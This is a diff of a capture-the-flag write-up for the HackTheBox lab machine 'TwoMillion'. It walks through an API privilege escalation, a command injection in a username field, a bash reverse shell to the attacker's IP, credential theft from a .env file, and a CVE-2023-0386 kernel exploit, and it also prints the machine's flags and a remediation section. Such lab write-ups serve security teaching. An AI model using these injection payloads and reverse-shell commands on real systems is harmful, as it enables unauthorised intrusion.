@@ -1,21 +1,25 @@
 ---
 layout: writeup
 title: TwoMillion
+date: 19/08/2025
 ---
 
 ## Overview
 
-This report details my compromise of 'TwoMillion'. [Brief overview of below sections]
+This report details the compromise of 'TwoMillion'. The engagement begins with web application enumeration, leading to the discovery of an insecure API endpoint that allows for privilege escalation within the application. This administrative access is then leveraged to exploit a command injection vulnerability, establishing an initial foothold on the system. User pivoting is achieved by discovering credentials in a misconfigured environment file, and finally, privilege escalation to root is accomplished by exploiting a known kernel vulnerability (CVE-2023-0386) found through in-system enumeration.
 
 Details:
 - **Machine:** TwoMillion
-- **IP:** 10.10.11.221
 - **OS:** Linux
 - **Difficulty:** 3.8/10
-- **Key Vulnerabilities:** ...
+- **Key Vulnerabilities:** Broken Access Control, Command Injection, Credential Leakage, Kernel Exploit (CVE-2023-0386)
 
 *Throughout this write-up, I will be using the IP address I was assigned - 10.10.11.221 - if you are assigned a different IP address, make sure to change it when following along.*\
-**OPEN VPN BIT HERE**
+
+Before we can begin any of the steps below, you must be connected to the HackTheBox network. The machines are hosted on a private network that is only accessible via a VPN connection. You can download your unique OpenVPN configuration file from the HackTheBox Access Page. Once downloaded, you can connect from your terminal using the following command:
+```bash
+sudo openvpn /path/to/your/file.ovpn
+```
 
 ## Reconnaissance & Enumeration
 
@@ -47,6 +51,7 @@ The following command pipes the output of `echo` (our line that links the IP add
 echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
 ```
 We should now be able to access the site:
+
 ![2million.htb frontpage](../resources/writeups/TwoMillion1.png)
 
 Initial enumeration of the site began with a manual inspection. Looking through the page revealed two interesting endpoints - `/login` and `/invite`.\
@@ -132,36 +137,175 @@ Accessing `/api/v1` allows us to enumerate all the available API endpoints which
   }
 }
 ```
-We can see three different `admin` endpoints, allowing us to access privileged actions. The first two aren't useful to us right now as we aren't an admin, although we will make a PUT request using BurpSuite to the third to see if we can update the settings for our user.\
-After some trial and error
+There are three different `admin` endpoints, allowing us to access privileged actions. The first two aren't useful to us right now as we aren't an admin, although we will make a PUT request using BurpSuite to the third to see if we can update the settings for our user.\
+We are notified that alongside our request, we need to send a body containing parameter values for `email` and `is_admin`.\
+Let's specify `Content-Type` as `application/json` to include these parameters alongside our request, using the `email` for our account and setting `is_admin` to 1 (equivalent to true) which will update our account settings to make us an admin:
+```http
+PUT /api/v1/admin/settings/update HTTP/1.1
+Host: 2million.htb
+Cache-Control: max-age=0
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://2million.htb/home
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=jinbcop505529lan6ebpsm6bp9
+Content-Type: application/json
+Connection: keep-alive
+Content-Length: 42
 
+{
+"email":"dash@dash.com",
+"is_admin":1
+}
+```
+We can confirm we are an admin by visiting `/api/v1/admin/auth`.\
+Now that we are able to access `/api/v1/admin/vpn/generate` we will use BurpSuite again to make a POST request here, being told once again to include a message body with the parameter `username`.\
+Specifying a username only yields another .ovpn file, which doesn't seem too useful to us here. Since only admins should have access to this endpoint, the input may not be properly sanitised, so we should attempt to detect a command injection vulnerability.\
+To start, let's provide a username followed by a semicolon `;` and our command `whoami`. The semicolon ends the current command, allowing our following text to be interpreted as its own command:
+```json
+{"username":"dash; whoami"}
+```
+The output is now empty. While this doesn't confirm a command injection vulnerability, we should always look further into something where our input can affect the application's behaviour.\
+Since `whoami`'s output isn't being sent back to us, we will try a different command to connect to our computer using `curl`. This command makes a `HTTP GET` request to the specified IP address.\
+In order to carry this out, we must first get our own IP address (which we can use `ifconfig` for) and then need to start a http server on our device. We can do this using Python:
+```bash
+sudo python -m http.server 80
+```
+This command starts a http server which runs on port 80 (the default port for http) on our IP.
+After attempting to make this request from the target machine *(replace the IP with your own)*:
+```json
+{"username":"dash; curl 10.10.14.107"}
+```
+We should see a connection has been made in our console from the machine's IP - confirming that a command injection vulnerability exists!
 
+![Command output showing the connection from the victim's machine](../resources/writeups/TwoMillion2.png)
 
+We should now create a reverse shell for ourselves, as it's easier to execute commands from a shell environment than the tedious process of using command injection every time.\
+Lots of reverse shell scripts are available on the internet, but for our purpose we will use a simple bash one.\
+The command creates a connection to an IP over a specified port meaning we must allow connections to our device and be listening on the specified port to correctly receive any incoming connections and their data.\
+We can do this by starting a http server again (the same as above) and then by running `netcat` (`nc`) to listen (`-l`) on port (`-p`) 1337:
+```bash
+sudo python -m http.server 80
+nc -lvnp 1337
+```
+After setting this up we can then input the bash command into the command injection vulnerability:
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.107/1337 0>&1'
+```
+- `bash -c` tells the shell to use **Bourne Again Shell** and execute the following command.
+- `bash -i` forces the shell to run in interactive mode, which is useful as automated users (such as www-data) may not have their sessions automatically configured to run in interactive mode.
+- `>& /dev/tcp/10.10.14.107/1337` will redirect both `stdout` and `stderror` over a network specified by /dev/tcp which is a special bash feature that allows it to create a network connection. In this instance it will redirect it to our IP on port `1337` (which our `netcat` is listening on).
+- `0>&1` means whatever is sent from our end to the connection's output will be treated as input - essentially what allows us to execute commands post-connection.
 
+Once we have completed this, we should then have a functional reverse shell accessible through our `netcat` command in our terminal:
 
+![Command output showing our reverse shell](../resources/writeups/TwoMillion3.png)
 
-Identifying the Vulnerability: Explain how you identified the exploitable flaw. "The Nmap scan revealed Samba version 3.0.20. A quick search using searchsploit confirmed this version is vulnerable to a remote command execution flaw (CVE-XXXX-XXXX)."
-The Exploit: Detail the exploitation process step-by-step. If you used a public exploit script, explain the command. If you did it manually, explain the logic.
-Gaining Access: Show the screenshot of your shell connection. Explain who you are on the box (whoami) and what your initial limitations are.
+**This is a great point to be at as we no longer need to use the website for anything and can now search for the user flag** however, this is a "dumb" shell; it's unstable, lacks tab-completion, and Ctrl+C will kill the entire session. To work more effectively, we should upgrade to a fully interactive TTY.
+<br>
+<details>
+<summary><strong>Pro-Tip: Click here for a guide on upgrading to a fully interactive shell.</strong></summary>
+<br>
+<p>Upgrading a basic reverse shell often involves a standard, three-step process and is a critical step for any serious enumeration:</p>
+<p><strong>Step 1: Spawn a TTY using Python</strong></p>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+<p><strong>Step 2: Background the Shell and Stabilize with <code>stty</code></strong></p>
+<ol>
+<li>Press <code>Ctrl+Z</code> to background your current shell session.</li>
+<li>In your <strong>local</strong> attacker terminal (not the reverse shell), enter the following:
+<pre><code>stty raw -echo; fg</code></pre>
+<p>
+<ul>
+<li><code>stty raw -echo</code> tells your local terminal to pass all keystrokes through without processing them first.</li>
+<li><code>fg</code> brings the backgrounded reverse shell process back to the foreground.</li>
+</ul>
+</p>
+</li>
+</ol>
+<p><strong>Step 3: Set the Terminal Type</strong></p>
+<pre><code>export TERM=xterm</code></pre>
+<p>You now have a fully functional, stable shell. You can use arrow keys, tab completion, <code>Ctrl+C</code>, and run interactive programs without killing your session.</p>
+</details>
+<br>
 
-user flag:
+## User Pivoting to `admin`
 
+The user flag is located in `/home/admin/user.txt` but we don't have read permissions for this file so we must pivot to the user `admin`.\
+Going back to our home directory and into `~/html` we are presented with a host of files and folders:
+
+![Command output showing files and folders in ~/html](../resources/writeups/TwoMillion4.png)
+
+Something that instantly pops out is `Database.php` which we can tell, upon reading, creates a database storing usernames and passwords.\
+Since we don't seem to be able to access the database, we should look for other files that the database may use/may have created. One common file that php uses to store its **Environment Variables** is `.env`.\
+Indeed, this file is present, and reading it gives us access to the admin's credentials:
+
+![Command output showing the admin's credentials](../resources/writeups/TwoMillion5.png)
+
+After saving this information, we can then exit this session and `ssh` back in using the admin's password, allowing us to read the user flag:
+```bash
+ssh admin@10.10.11.221 -p 22
+```
+![Command output showing us logged in as admin and the user flag](../resources/writeups/TwoMillion6.png)
+
+**User Flag:** d462f9bd87e4e7bdbd751c29e6c52fc1
 
 ## Privilege Escalation
 
-Internal Enumeration: This is critical. Explain your methodology. "Now with user-level access, the goal is to become root. My methodology involves checking for SUID binaries, sudo permissions, cron jobs, and running a script like linpeas.sh to automate the search for common vectors."
-The Vulnerable Vector: Explain what you found. "The linpeas.sh script highlighted an unusual cron job running as root. Upon inspecting the script, I discovered it was world-writable..."
-The Escalation: Detail how you exploited this vector. "I replaced the contents of the script with a reverse shell payload. After waiting for the cron job to execute, I received a new shell on my listening netcat session, now running with root privileges."
-Proof: Show the screenshot of whoami returning root and the contents of the root.txt flag.
+Now with user-level access, the goal is to become root. My methodology will start by running linPEAS to enumerate potential vulnerabilities.\
+You can find linPEAS [here](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and once downloaded can get it on the target system by using a simple curl command to your IP.\
+We will also need to add execution (`+x`) permissions to this file:
+```bash
+curl 10.10.14.107/linPEAS > /tmp/linPEAS
+cd /tmp
+chmod +x linPEAS
+./linPEAS
+```
+*Keep in mind you will need to start a http server again if you closed your old one.*\
+\
+The linPEAS script highlighted lots of potential attack vectors, although one that particularly caught my eye was the existence of a mail location which actually contained an email:
 
+![linPEAS output showing mail directories](../resources/writeups/TwoMillion7.png)
+
+Navigating to this directory and reading the email gives us vital information that the Linux machine is very likely vulnerable to a CVE related to OverlayFS / FUSE:
+
+![Email accessible by admin](../resources/writeups/TwoMillion8.png)
+
+A quick Google search reveals **CVE-2023-0386** as the method they are referring to in this email. We can find a Proof Of Concept (PoC) for this vulnerability on GitHub (here)[https://github.com/puckiestyle/CVE-2023-0386].\
+The directory uses a Makefile to build the code into an executable which, when run, should give us root.\
+Our first step is to clone the repository, zip it, and transfer it to our target machine:
+```bash
+git clone https://github.com/puckiestyle/CVE-2023-0386
+zip -r CVE.zip CVE-2023-0386
+```
+Using our http server we can then download the file from the target machine with `curl`:
+```bash
+curl 10.10.14.107/CVE.zip > /tmp/CVE.zip
+```
+Extracting the zip and running `make all` builds the PoC. Following the README.md instructions on the GitHub repository executes the PoC and gives us root:
+```bash
+# Execute in terminal 1
+./fuse ./ovlcap/lower ./gc
+# Execute in terminal 2
+./exp
+```
+*Note: you will need to create another ssh session for your second terminal and `cd` into the same directory for both.*
+
+![Terminal output showing PrivEsc success](../resources/writeups/TwoMillion9.png)
+
+**Root Flag:** d66f05a7993ed29518d8dfb7add912c7
 
 ## Conclusion
 
-Remediation & Mitigation
-This is your "Blue Team" section. For each key vulnerability, provide a concise, professional recommendation.
-Initial Foothold: "The Samba RCE could be mitigated by updating the Samba service to the latest patched version. As a compensating control, network firewalls should be configured to restrict access to port 445 to only trusted internal IP ranges."
-Privilege Escalation: "The privilege escalation was possible due to insecure file permissions on a script executed by a cron job. The script's permissions should be hardened to be owned by root and writable only by the owner (chmod 755). Regular security audits should be performed to detect and correct such misconfigurations."
+### Remediation & Mitigation
+For a system to be secure, it is vital to understand its vulnerabilities and how they could be fixed. Below are the key security failings found in this machine and ways to mitigate them:
+- Broken Access Control in API: The API endpoint for updating user settings (/api/v1/admin/settings/update) failed to validate that the requesting user was an administrator. This could be fixed by implementing proper server-side authorisation checks on all privileged endpoints.
+- Command Injection: The application passed unsanitised user input from the username parameter directly to a system shell. This could be mitigated by validating all user input and using parameterised functions that treat input as data, not executable code.
+- Credential Leakage in Environment File: Administrative credentials were found in a world-readable .env file. Sensitive files like this should have hardened file permissions so they are only readable by the owner.
+- Outdated Kernel: The system was vulnerable to a known kernel exploit (CVE-2023-0386) which allowed for root access. A patch management policy should be implemented to ensure all system and kernel components are kept up-to-date with the latest security patches.
 
-Conclusion & Key Takeaways
-A brief, final paragraph. What did you learn from this box? Was there a new tool you used or a technique you refined?
-Example: "The 'Lame' machine was a valuable exercise in exploiting classic, unpatched services. It served as a powerful reminder that consistent patch management is one of the most effective security controls. Furthermore, it reinforced my internal enumeration methodology, leading directly to the privilege escalation vector."
+### Conclusion & Key Takeaways
+Overall, the TwoMillion machine was a valuable exercise in multi-stage attacks, showing how a single flaw in a web application can lead to a full system compromise.\
+A key takeaway from this box was the importance of thorough API enumeration. What started as a simple user registration process quickly led to a full compromise, all because we took the time to map out and test every available endpoint.\
+Furthermore, this box showed how vital post-exploitation enumeration is. Finding the .env file wasn't luck; it was the result of methodically searching the webroot after our initial foothold, a step that's crucial for finding the path forward. Finally, reaching root by finding an email about a known CVE serves as a powerful reminder that keeping a system patched is one of the most basic but important security measures.
